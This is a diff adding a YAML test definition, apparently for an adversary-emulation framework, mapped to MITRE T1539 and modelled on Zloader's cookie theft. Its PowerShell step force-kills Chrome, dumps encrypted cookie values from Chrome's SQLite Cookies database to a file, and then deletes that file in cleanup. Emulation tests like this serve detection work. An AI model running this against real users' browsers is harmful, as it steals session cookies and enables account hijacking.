@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Steal Chrome Cookies (Windows)
+description: "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n"
+args:
+    - name: cookie_db
+      type: string
+      default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies
+    - name: sqlite3_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+    - name: output_file
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
+uuid: 26a6b840-4943-4965-8df5-ef1f9a282440
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1539: Steal Web Session Cookie'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: steal-chrome-cookies-(windows)
+      inline: |
+        stop-process -name "chrome" -force -erroraction silentlycontinue
+        "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c {{.Args.sqlite3_path}} "{{.Args.cookie_db}}" | out-file -filepath "{{.Args.output_file}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            remove-item {{.Args.output_file}}
+        executor: powershell
